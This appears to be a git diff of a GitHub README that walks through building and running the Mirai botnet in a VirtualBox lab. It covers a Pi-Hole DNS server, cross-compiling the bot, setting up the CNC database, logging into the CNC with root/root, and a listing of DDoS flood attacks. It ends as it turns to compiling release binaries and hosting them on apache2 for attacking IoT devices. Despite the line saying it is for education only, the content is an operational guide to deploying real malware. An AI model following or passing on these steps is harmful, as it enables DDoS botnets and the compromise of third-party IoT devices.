@@ -5,13 +5,33 @@
 - Virtual Box(with atleast 3 instances of Ubuntu) 
 - Copy of mirai source code
 
+
 ## What we will do
 The goal is to setup and run mirai in an local environment.  
 But a disclaimer at the beginning: Do not use this to actually attack somebody its only for educational use.
 <br><br>
 
+## Common to all the Virtual Machines
+
+In the network settings enable the network adpater 2 and set to to "internal adapter" with the name "intnet" as shown below:
+![network_settings_vbox](https://github.com/LohithCV/mirai-setup/assets/125025760/5a72d1c4-4d35-4db5-93d4-bd36ed613a69)
+
+Now power on all machines and then upgrade and update all the machines using the below command:
+
+```
+sudo apt update && sudo apt upgrade
+```
+
 ## Virtual Machine - 1 DNS server
-First we need to setup a local DNS server to have query resolution to run bot.
+First make sure both the NAT interface and internal network interface is running. It can checked by running the following command in the terminal:
+```
+ip a
+```
+This is what you will see:
+"IMAGE OF IP A"
+Note down the IPv4 address and network interface of the internal network interface. In the above figure it is 169.254.  . and ensp 
+
+Now we setup a local DNS server to have query resolution to run bot.
 For this we will be using Pi-Hole
 
 To install Pi-Hole run the following command
@@ -19,18 +39,46 @@ To install Pi-Hole run the following command
 ```
 curl -sSL https://install.pi-hole.net | sudo PIHOLE_SKIP_OS_CHECK=true bash
 ```
-Packages will be installed and then a dialog will be shown as below:
+Packages will be installed and then a dialogs will be shown as below:
+1. Select OK
+<br>![PI_HOLE_1](https://github.com/LohithCV/mirai-setup/assets/125025760/9518168d-3291-4f19-855c-94771b661d51)
+2. Select OK 
+<br>![PI_HOLE_2](https://github.com/LohithCV/mirai-setup/assets/125025760/57485b5f-036a-4fc0-b69a-36d077779d26)
+3. Select Continue
+<br>![PI_HOLE_3](https://github.com/LohithCV/mirai-setup/assets/125025760/12bbe25c-ee92-4207-9ebe-a9310bb35ae2)
+4. Choose the network interface that was noted previously, i.e, the internal network interface
+<br>![PI_HOLE_4](https://github.com/LohithCV/mirai-setup/assets/125025760/6749a27b-20e3-4210-afeb-46a36f8213bb)
+5. Select Yes
+<br>![PI_HOLE_5](https://github.com/LohithCV/mirai-setup/assets/125025760/30fabdd9-ad4e-4f4a-afcf-a3ecf7d9ea68)
+6. Select Yes, since we will be needing the web interface to add our local DNS query
+<br>![PI_HOLE_6](https://github.com/LohithCV/mirai-setup/assets/125025760/5dcdf497-b1c6-41d2-b8b1-c16812eb551b)
+7. Select Yes
+<br>![PI_HOLE_7](https://github.com/LohithCV/mirai-setup/assets/125025760/8b7df295-76d6-411c-93c0-8b907ab5dcbf)
+8. Select Yes
+<br>![PI_HOLE_8](https://github.com/LohithCV/mirai-setup/assets/125025760/102c6995-aadc-49d8-a918-1b01a382041e)
+9. Select show everything
+<br>![PI_HOLE_9](https://github.com/LohithCV/mirai-setup/assets/125025760/8a1ddb5f-d3f4-4728-ba43-c519b8d59826)
+10. Now u can see the web interface address and password for logging in. Note this down or the password can be changed as shown in the further steps.
+<br>![PI_HOLE_10](https://github.com/LohithCV/mirai-setup/assets/125025760/d9ed3134-ccc7-41e3-9c4e-f50892c91476)
+
 
 Change the Pi-Hole password using this command
 
 ```
+
 pihole -a -p [password]
 ```
 
-Open Pi-Hole in your browser with the url that is shown in the terminal.
+Open Pi-Hole in your browser with the url that was shown Step 10.
+If everything is done right the login window will appear as below:
+<br>![PI_HOLE_11](https://github.com/LohithCV/mirai-setup/assets/125025760/b9722cb1-724a-4f7a-80a7-02fc3975db5b)
+<br>Use the set password to login and the we interface looks something like this:
+<br>![PI_HOLE_12](https://github.com/LohithCV/mirai-setup/assets/125025760/16d21d40-7a3a-44d5-8eda-7a504403121f)
 
+The local DNS server setup is done.
 
 ## Virtual Machine - 2 CNC & MySQL server
+
 ### First we need to install some packages  
 
 ```
@@ -47,7 +95,7 @@ sudo bash ./tools/compilers.sh
 **Now please restart your bash for those changes to take effect**
 <br>
 
-Now add paths for the installed cross-compilers into bash
+Now add paths for the installed cross-compilers into bash.
 
 To do that run 
 
@@ -70,7 +118,7 @@ export PATH=$PATH:"/etc/xcompile/sh4/bin"
 export PATH=$PATH:"/etc/xcompile/sparc/bin"
 export PATH=$PATH:"/etc/xcompile/x86_64/bin"
 ```
-save it and restart the terminal
+Save it and restart the terminal
 ### Now we can compile it for the first time
 ```
 bash ./setup.sh
@@ -78,7 +126,7 @@ bash ./build.sh debug telnet
 ```
 <br>
 
-### Now we need to setup the database it's easy trust me.
+### Now we need to setup the database.
 Simply run:
 ```
 cat ./tools/db.sql | sudo mysql
@@ -96,83 +144,61 @@ Simply run and type in your domain and dns server:
 ```
 python3 setup.py
 ```
-<br>
+1. Put in some dummy domain for ex: www.mirai.com as shown below
+<br>![py_1](https://github.com/LohithCV/mirai-setup/assets/125025760/ebc2c112-11d6-4ddc-b6fe-73cc4a481a20)
+2. Put in the same domain as the step-1 for scanner domain as well
+<br>![py_2](https://github.com/LohithCV/mirai-setup/assets/125025760/eac0380a-c1f3-4746-951f-6b0cd9b51869)
+3. Type in the internal network IPv4 address of the DNS Server machine as noted in the previous steps
+<br>![py_3](https://github.com/LohithCV/mirai-setup/assets/125025760/6f2904c3-9072-42f8-9408-6862a35b44a8)
+4. Select Yes
+<br>![py_4](https://github.com/LohithCV/mirai-setup/assets/125025760/1c4aecd2-818a-4689-a347-df8565d0a6cf)
+5. Select Yes
+<br>![py_5](https://github.com/LohithCV/mirai-setup/assets/125025760/3556d88d-4612-4a13-adc6-aa645109b100)
 
-### Now we can compile it for the second time :D
+Now change the DNS resolver of this machine to the local DNS server's IP.
+Run this command to change the DNS IP:
+
+```
+sudo nano /etc/resolv.conf
+```
+Change the nameserver to the IP of internal netowrk IP of the DNS server machine as noted in the previous steps.
+
+### Now we can compile it for the second time
 ```
 bash ./build.sh debug telnet
 ```
 <br>
 
-### Now its time to setup pihole
-To do this you need to login into pihole and go to Local DNS/DNS Records and type in the domain you used earlier in this tutorial and the ip of the server where the cnc is supposed to run on. **Don't forget to click on add!**
-<br>
-
-### And finlay we can run it!
+### And finally we can run it!
 To run the cnc use:
 ```
 cd debug
 screen -S mirai-cnc sudo ./cnc
 ```
 <br>
+The cnc server will start as below:
 
-To run a bot use:
-```
-cd debug
-screen -S mirai-bot sudo ./mirai.dbg
-```
-<br>
+![ter_1](https://github.com/LohithCV/mirai-setup/assets/125025760/e61cc2b0-7961-4674-a417-efdc4a25c970)
 
-To connect to the cnc using telnet use:
+To connect to the cnc using telnet run this command in a terminal instance:
 ```
 telnet localhost
-
-You will be asked to login you can do that with the user we inserted earlier into the database it should look something like:
-
-я люблю куриные наггетсы
-пользователь: root
-пароль: root
-
-проверив счета... |
-[+] DDOS | Succesfully hijacked connection
-[+] DDOS | Masking connection from utmp+wtmp...
-[+] DDOS | Hiding from netstat...
-[+] DDOS | Removing all traces of LD_PRELOAD...
-[+] DDOS | Wiping env libc.poison.so.1
-[+] DDOS | Wiping env libc.poison.so.2
-[+] DDOS | Wiping env libc.poison.so.3
-[+] DDOS | Wiping env libc.poison.so.4
-[+] DDOS | Setting up virtual terminal...
-[!] Sharing access IS prohibited!
-[!] Do NOT share your credentials!
-Ready
-root@botnet#
 ```
+<br>Username: root
+<br>Password: root
+<br>Type in these credentials and the attacker's terminal is ready:
+
+<br>![ter_2](https://github.com/LohithCV/mirai-setup/assets/125025760/e5b371b7-3c15-4bb5-913c-5e9d1ed897ab)
+<br>To see the possible attacks that can be carried out with this terminal type in ?:
+<br>![ter_3](https://github.com/LohithCV/mirai-setup/assets/125025760/dfa5490f-4f3f-4e15-8e19-0e02f78c1e6d)
 <br>
-
-Finaly to see a list of attacks type:
-```
-root@botnet# ?
-Available attack list
-udp: UDP flood
-dns: DNS resolver flood using the targets domain, input IP is ignored
-stomp: TCP stomp flood
-greip: GRE IP flood
-greeth: GRE Ethernet flood
-vse: Valve source engine specific flood
-syn: SYN flood
-ack: ACK flood
-udpplain: UDP flood with less options. optimized for higher PPS
-http: HTTP flood
-```
-<br>
-
 ### But wait there is more
 We didn't see how to attack iot devices yet but first of all we need to compile the release binary's:
 ```
 bash ./build.sh release telnet
 ```
 <br>
+
 
 Let's install the binary's to apache2:
 ```
